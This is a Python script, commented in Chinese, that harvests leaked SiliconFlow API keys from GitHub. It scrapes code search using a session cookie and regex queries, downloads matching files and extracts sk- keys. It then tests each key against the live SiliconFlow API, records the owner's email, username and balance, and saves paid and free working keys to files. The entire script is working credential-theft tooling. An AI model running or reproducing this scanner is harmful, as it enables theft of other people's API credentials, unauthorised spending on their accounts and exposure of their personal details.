#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
专门扫描SiliconFlow API密钥的并发扫描器
支持多线程并发搜索以提高扫描速度
区分付费和免费密钥，支持余额查询
现在使用 GITHUB_SESSION 进行搜索，支持正则表达式
"""

import os
import re
import time
import threading
import concurrent.futures
from queue import Queue
import requests
from datetime import datetime
import json
import random

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# SiliconFlow API 配置
SILICONFLOW_BASE_URL = "https://api.siliconflow.cn/v1"
SILICONFLOW_CHAT_URL = f"{SILICONFLOW_BASE_URL}/chat/completions"
SILICONFLOW_USER_INFO_URL = f"{SILICONFLOW_BASE_URL}/user/info"

# 测试模型配置
PRO_MODEL = "Pro/deepseek-ai/DeepSeek-V3"  # 付费模型
FREE_MODEL = "Qwen/Qwen2.5-7B-Instruct"   # 免费模型

# 并发配置
MAX_WORKERS = 5  # 最大并发线程数
API_DELAY = 1.5  # API请求间隔（秒）
MAX_RESULTS_PER_QUERY = 500  # 每个查询最多检查的结果数

# 存储结果的线程安全队列
paid_keys_queue = Queue()    # 付费密钥
free_keys_queue = Queue()    # 免费密钥
processed_keys = set()       # 防止重复处理相同密钥
lock = threading.Lock()
file_lock = threading.Lock() # 文件写入锁

# 实时保存文件名（全局变量）
paid_keys_filename = None
free_keys_filename = None
live_keys_filename = None
paid_simple_filename = None
free_simple_filename = None

# --- GitHub Session Search 相关函数 ---

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("Missing GITHUB_SESSION")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def search_github(query, max_pages=5):
    links = set()
    print(f"📡 搜索: {query}")
    
    for page in range(1, max_pages + 1):
        try:
            url = "https://github.com/search"
            params = {'q': query, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
            
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code == 429:
                print("   ⚠️ Rate Limited (429). Waiting 60s...")
                time.sleep(60)
                continue
            elif resp.status_code != 200:
                print(f"   ❌ Error {resp.status_code}")
                break
                
            # 提取链接
            page_links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            if not page_links:
                break
                
            for link in page_links:
                full = "https://github.com" + link.split('#')[0]
                links.add(full)
                
            print(f"   Page {page}: found {len(page_links)} links")
            time.sleep(random.uniform(2, 4))
            
        except Exception as e:
            print(f"   Search Error: {e}")
            break
            
    return list(links)

# --- SiliconFlow API 相关函数 ---

def save_live_key_immediately(key_info, key_type):
    """实时保存存活密钥到文件"""
    global paid_keys_filename, free_keys_filename, live_keys_filename
    global paid_simple_filename, free_simple_filename
    
    with file_lock:
        # 如果文件名还未初始化，创建文件名
        if paid_keys_filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            paid_keys_filename = f'siliconflow_paid_keys_{timestamp}.txt'
            free_keys_filename = f'siliconflow_free_keys_{timestamp}.txt'
            live_keys_filename = f'siliconflow_live_keys_{timestamp}.txt'
            paid_simple_filename = f'siliconflow_paid_simple_{timestamp}.txt'
            free_simple_filename = f'siliconflow_free_simple_{timestamp}.txt'
            
            # 创建付费密钥文件头部
            with open(paid_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== SiliconFlow 付费API密钥扫描结果 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"API端点: {SILICONFLOW_CHAT_URL}\n")
                f.write(f"付费模型: {PRO_MODEL}\n")
                f.write("=" * 60 + "\n\n")
            
            # 创建免费密钥文件头部
            with open(free_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== SiliconFlow 免费API密钥扫描结果 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"API端点: {SILICONFLOW_CHAT_URL}\n")
                f.write(f"免费模型: {FREE_MODEL}\n")
                f.write("=" * 60 + "\n\n")
            
            # 创建汇总文件头部
            with open(live_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== SiliconFlow API密钥扫描结果汇总 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
            
            # 创建简化文件头部
            with open(paid_simple_filename, 'w', encoding='utf-8') as f:
                f.write("=== SiliconFlow 付费密钥列表 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 40 + "\n\n")
            
            with open(free_simple_filename, 'w', encoding='utf-8') as f:
                f.write("=== SiliconFlow 免费密钥列表 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 40 + "\n\n")
        
        # 根据密钥类型保存到相应文件
        if key_type == "paid":
            # 保存到付费密钥详细文件
            with open(paid_keys_filename, 'a', encoding='utf-8') as f:
                f.write(f"🔑 {key_info['type']}\n")
                f.write(f"   密钥: {key_info['key']}\n")
                f.write(f"   状态: {key_info['status']}\n")
                f.write(f"   账户类型: {key_info['account_type']}\n")
                f.write(f"   可用模型: {key_info['model_access']}\n")
                
                user_info = key_info.get('user_info', {})
                if user_info:
                    f.write(f"   用户ID: {user_info.get('user_id', 'N/A')}\n")
                    f.write(f"   用户名: {user_info.get('username', 'N/A')}\n")
                    f.write(f"   邮箱: {user_info.get('email', 'N/A')}\n")
                    f.write(f"   总余额: ${user_info.get('total_balance', 0):.2f}\n")
                    f.write(f"   付费余额: ${user_info.get('charge_balance', 0):.2f}\n")
                    f.write(f"   免费余额: ${user_info.get('balance', 0):.2f}\n")
                
                f.write(f"   仓库: {key_info['repo']}\n")
                f.write(f"   文件: {key_info['file_path']}\n")
                f.write(f"   链接: {key_info['url']}\n")
                f.write(f"   发现时间: {key_info['discovered_time']}\n")
                f.write(f"   处理线程: Worker-{key_info['worker_id']}\n")
                f.write("-" * 60 + "\n")
            
            # 保存到付费密钥简化文件
            with open(paid_simple_filename, 'a', encoding='utf-8') as f:
                f.write(f"{key_info['key']}\n")
            
            print(f"💰 已实时保存付费密钥到: {paid_keys_filename}")
            
        elif key_type == "free":
            # 保存到免费密钥详细文件
            with open(free_keys_filename, 'a', encoding='utf-8') as f:
                f.write(f"🔑 {key_info['type']}\n")
                f.write(f"   密钥: {key_info['key']}\n")
                f.write(f"   状态: {key_info['status']}\n")
                f.write(f"   账户类型: {key_info['account_type']}\n")
                f.write(f"   可用模型: {key_info['model_access']}\n")
                
                user_info = key_info.get('user_info', {})
                if user_info:
                    f.write(f"   用户ID: {user_info.get('user_id', 'N/A')}\n")
                    f.write(f"   用户名: {user_info.get('username', 'N/A')}\n")
                    f.write(f"   邮箱: {user_info.get('email', 'N/A')}\n")
                    f.write(f"   总余额: ${user_info.get('total_balance', 0):.2f}\n")
                    f.write(f"   免费余额: ${user_info.get('balance', 0):.2f}\n")
                
                f.write(f"   仓库: {key_info['repo']}\n")
                f.write(f"   文件: {key_info['file_path']}\n")
                f.write(f"   链接: {key_info['url']}\n")
                f.write(f"   发现时间: {key_info['discovered_time']}\n")
                f.write(f"   处理线程: Worker-{key_info['worker_id']}\n")
                f.write("-" * 60 + "\n")
            
            # 保存到免费密钥简化文件
            with open(free_simple_filename, 'a', encoding='utf-8') as f:
                f.write(f"{key_info['key']}\n")
            
            print(f"🆓 已实时保存免费密钥到: {free_keys_filename}")
        
        # 同时追加到汇总文件
        with open(live_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔑 {key_info['type']}\n")
            f.write(f"   密钥: {key_info['key']}\n")
            f.write(f"   状态: {key_info['status']}\n")
            f.write(f"   仓库: {key_info['repo']}\n")
            f.write(f"   发现时间: {key_info['discovered_time']}\n")
            f.write("-" * 30 + "\n")

def get_user_info(api_key):
    """获取用户账户信息和余额"""
    try:
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        
        response = requests.get(SILICONFLOW_USER_INFO_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("code") == 20000 and data.get("status"):
                user_data = data.get("data", {})
                return {
                    "success": True,
                    "balance": float(user_data.get("balance", 0)),
                    "charge_balance": float(user_data.get("chargeBalance", 0)),
                    "total_balance": float(user_data.get("totalBalance", 0)),
                    "user_id": user_data.get("id", ""),
                    "username": user_data.get("name", ""),
                    "email": user_data.get("email", ""),
                    "status": user_data.get("status", "")
                }
        
        return {"success": False, "error": f"HTTP {response.status_code}: {response.text}"}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

def test_model_access(api_key, model_name):
    """测试模型访问权限"""
    try:
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "model": model_name,
            "messages": [
                {"role": "user", "content": "Hello"}
            ],
            "max_tokens": 1,
            "temperature": 0.1
        }
        
        response = requests.post(SILICONFLOW_CHAT_URL, 
                               headers=headers, 
                               json=payload, 
                               timeout=15)
        
        if response.status_code == 200:
            return {"success": True, "model": model_name}
        else:
            return {"success": False, "error": f"HTTP {response.status_code}: {response.text}"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}

def check_siliconflow_key(key):
    """验证SiliconFlow API密钥是否有效并分类"""
    if not key.startswith("sk-"):
        return {"status": "无效格式", "type": "invalid"}
    
    # 获取用户信息
    user_info = get_user_info(key)
    if not user_info["success"]:
        return {
            "status": f"🔴 无效/已吊销 (Invalid/Revoked): {user_info['error'][:100]}",
            "type": "invalid"
        }
    
    # 检查是否为付费账户
    charge_balance = user_info.get("charge_balance", 0)
    total_balance = user_info.get("total_balance", 0)
    
    if charge_balance > 0:
        # 付费账户，测试Pro模型
        model_test = test_model_access(key, PRO_MODEL)
        if model_test["success"]:
            return {
                "status": f"🟢 付费账户存活 (Paid Live) - 余额: ${total_balance:.2f} (付费: ${charge_balance:.2f})",
                "type": "paid",
                "user_info": user_info,
                "model_access": PRO_MODEL
            }
        else:
            return {
                "status": f"🟡 付费账户但模型访问失败 (Paid but Model Failed): {model_test['error'][:100]}",
                "type": "paid_limited",
                "user_info": user_info
            }
    else:
        # 免费账户，测试免费模型
        if total_balance > 0:
            model_test = test_model_access(key, FREE_MODEL)
            if model_test["success"]:
                return {
                    "status": f"🟢 免费账户存活 (Free Live) - 余额: ${total_balance:.2f}",
                    "type": "free",
                    "user_info": user_info,
                    "model_access": FREE_MODEL
                }
            else:
                return {
                    "status": f"🟡 免费账户但模型访问失败 (Free but Model Failed): {model_test['error'][:100]}",
                    "type": "free_limited",
                    "user_info": user_info
                }
        else:
            return {
                "status": f"🔴 账户无余额 (No Balance) - 余额: ${total_balance:.2f}",
                "type": "no_balance",
                "user_info": user_info
            }

def process_content_file(file_url, worker_id):
    """下载并处理单个文件内容，提取并验证API密钥"""
    try:
        print(f"[Worker-{worker_id}] 正在检查: {file_url}")
        
        # 构造 Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200:
            return
            
        file_content = resp.text
        
        # 使用正则表达式提取sk-密钥 (精确匹配48位后缀)
        pattern = r'(sk-[A-Za-z0-9]{48})'
        potential_keys = re.findall(pattern, file_content)
        
        for key in potential_keys:
            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
            
            # 验证密钥
            result = check_siliconflow_key(key)
            print(f"[Worker-{worker_id}] 🔑 密钥状态: {result['status']}")
            
            # 根据类型立即保存并添加到相应队列
            if result["type"] in ["paid", "paid_limited"]:
                repo_match = re.search(r'github\.com/([^/]+/[^/]+)', file_url)
                repo_name = repo_match.group(1) if repo_match else "unknown"
                
                key_info = {
                    'type': 'SiliconFlow Paid Key',
                    'key': key,
                    'status': result['status'],
                    'account_type': result['type'],
                    'user_info': result.get('user_info', {}),
                    'model_access': result.get('model_access', 'N/A'),
                    'url': file_url,
                    'repo': repo_name,
                    'file_path': file_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'worker_id': worker_id
                }
                
                save_live_key_immediately(key_info, "paid")
                paid_keys_queue.put(key_info)
                print(f"[Worker-{worker_id}] ✅ 已实时保存并记录付费密钥")
                
            elif result["type"] in ["free", "free_limited"]:
                repo_match = re.search(r'github\.com/([^/]+/[^/]+)', file_url)
                repo_name = repo_match.group(1) if repo_match else "unknown"

                key_info = {
                    'type': 'SiliconFlow Free Key',
                    'key': key,
                    'status': result['status'],
                    'account_type': result['type'],
                    'user_info': result.get('user_info', {}),
                    'model_access': result.get('model_access', 'N/A'),
                    'url': file_url,
                    'repo': repo_name,
                    'file_path': file_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'worker_id': worker_id
                }
                
                save_live_key_immediately(key_info, "free")
                free_keys_queue.put(key_info)
                print(f"[Worker-{worker_id}] ✅ 已实时保存并记录免费密钥")
            
            # 添加延迟以避免API速率限制
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] ❌ 处理文件时出错: {e}")

def concurrent_search_and_validate():
    """并发搜索和验证SiliconFlow密钥"""
    print(f"🚀 开始并发搜索SiliconFlow密钥 (并发数: {MAX_WORKERS})")
    print("=" * 60)
    
    # 定义搜索查询 (支持正则)
    # 使用用户指定的精确查询语法
    search_queries = [
        '/sk-[a-z0-9]{48}/ siliconflow',
        '/sk-[a-z0-9]{48}/ 硅基流动',
        '/sk-[a-z0-9]{48}/ Pro/deepseek-ai/DeepSeek-V3',
        '/sk-[a-z0-9]{48}/ Pro/deepseek-ai/DeepSeek-R1',
        '/sk-[a-z0-9]{48}/ tencent/Hunyuan-',
        '/sk-[a-z0-9]{48}/ Pro/moonshotai',
        '/sk-[a-z0-9]{48}/ THUDM/GLM-',
        '/sk-[a-z0-9]{48}/ Pro/BAAI',
        '/sk-[a-z0-9]{48}/ zai-org/GLM-',
        '/sk-[a-z0-9]{48}/ MiniMaxAI/MiniMax-',
        '/sk-[a-z0-9]{48}/ inclusionAI/Ling-',
        '/sk-[a-z0-9]{48}/ Pro/Qwen',
        '/sk-[a-z0-9]{48}/ Pro/THUDM',
        '/sk-[a-z0-9]{48}/ deepseek-ai/',
        '/sk-[a-z0-9]{48}/ Qwen/',
        '/sk-[a-z0-9]{48}/ Qwen/Qwen3-',
        '/sk-[a-z0-9]{48}/ Pro/black-forest-labs',
        '/sk-[a-z0-9]{48}/',
    ]
    
    all_file_urls = set()
    
    # 收集所有搜索结果
    for query in search_queries:
        print(f"📡 执行搜索查询: {query}")
        urls = search_github(query, max_pages=5)
        all_file_urls.update(urls)
        # 避免太过频繁
        time.sleep(2)
    
    file_list = list(all_file_urls)
    print(f"🗂️ 去重后共 {len(file_list)} 个唯一文件需要处理")
    
    # 使用线程池并发处理文件
    if file_list:
        print(f"⚡ 启动 {MAX_WORKERS} 个工作线程进行并发处理...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # 提交所有任务
            futures = [executor.submit(process_content_file, url, i % MAX_WORKERS + 1) for i, url in enumerate(file_list)]
            
            # 等待所有任务完成
            completed = 0
            total = len(file_list)
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                try:
                    future.result()
                    print(f"📊 进度: {completed}/{total} ({(completed/total)*100:.1f}%)")
                except Exception as e:
                    print(f"❌ 任务异常: {e}")
    
    print("\n✅ 所有文件处理完成")

def save_results():
    """保存扫描结果统计信息"""
    paid_keys = []
    free_keys = []
    
    # 从队列中获取所有结果
    while not paid_keys_queue.empty():
        paid_keys.append(paid_keys_queue.get())
    
    while not free_keys_queue.empty():
        free_keys.append(free_keys_queue.get())
    
    if paid_keys or free_keys:
        # 由于已经实时保存，这里只需要更新实时文件的统计信息
        global paid_keys_filename, free_keys_filename, live_keys_filename
        
        with file_lock:
            # 更新付费密钥文件统计
            if paid_keys and paid_keys_filename:
                with open(paid_keys_filename, 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"扫描完成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"总计发现付费密钥: {len(paid_keys)} 个\n")
                    f.write(f"并发线程数: {MAX_WORKERS}\n")
                    f.write(f"{'='*60}\n")
                
                print(f"💰 已更新付费密钥统计信息到: {paid_keys_filename}")
            
            # 更新免费密钥文件统计
            if free_keys and free_keys_filename:
                with open(free_keys_filename, 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"扫描完成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"总计发现免费密钥: {len(free_keys)} 个\n")
                    f.write(f"并发线程数: {MAX_WORKERS}\n")
                    f.write(f"{'='*60}\n")
                
                print(f"🆓 已更新免费密钥统计信息到: {free_keys_filename}")
            
            # 更新汇总文件统计
            if live_keys_filename:
                with open(live_keys_filename, 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"扫描完成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"付费密钥数量: {len(paid_keys)}\n")
                    f.write(f"免费密钥数量: {len(free_keys)}\n")
                    f.write(f"总计: {len(paid_keys) + len(free_keys)}\n")
                    f.write(f"并发线程数: {MAX_WORKERS}\n")
                    f.write(f"处理的唯一密钥数: {len(processed_keys)}\n")
                    f.write(f"{'='*60}\n")
                
                print(f"📊 已更新汇总统计信息到: {live_keys_filename}")
        
        print(f"💾 实时保存的付费密钥文件: {paid_keys_filename}")
        print(f"💾 实时保存的免费密钥文件: {free_keys_filename}")
        print(f"💾 实时保存的汇总文件: {live_keys_filename}")
        print(f"💾 实时保存的付费简化文件: {paid_simple_filename}")
        print(f"💾 实时保存的免费简化文件: {free_simple_filename}")
    else:
        print("\n📝 未发现存活的SiliconFlow密钥")

def main():
    """主函数"""
    if not GITHUB_SESSION:
        print("❌ 错误: 请在 .env 文件中设置 GITHUB_SESSION 以使用 Session 搜索模式")
        return

    print("🔍 SiliconFlow API密钥并发扫描器 (Session Search Mode)")
    print("=" * 50)
    print(f"⚙️ 配置:")
    print(f"   - 最大并发线程数: {MAX_WORKERS}")
    print(f"   - API请求延迟: {API_DELAY}秒")
    print(f"   - 付费模型: {PRO_MODEL}")
    print(f"   - 免费模型: {FREE_MODEL}")
    print("=" * 50)
    
    start_time = time.time()
    
    try:
        print("\n🚀 开始扫描...")
        
        # 执行并发搜索和验证
        concurrent_search_and_validate()
        
        # 保存结果
        save_results()
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        print(f"\n🏁 扫描完成!")
        print(f"⏱️ 总耗时: {elapsed_time:.2f}秒")
        print(f"🔧 处理的唯一密钥数: {len(processed_keys)}")
        print(f"💰 发现付费密钥数: {paid_keys_queue.qsize()}")
        print(f"🆓 发现免费密钥数: {free_keys_queue.qsize()}")
        
    except KeyboardInterrupt:
        print("\n🛑 用户中断扫描")
        save_results()  # 保存已找到的结果
    except Exception as e:
        print(f"\n❌ 扫描过程中发生错误: {e}")
        save_results()  # 保存已找到的结果

if __name__ == '__main__':
    main()
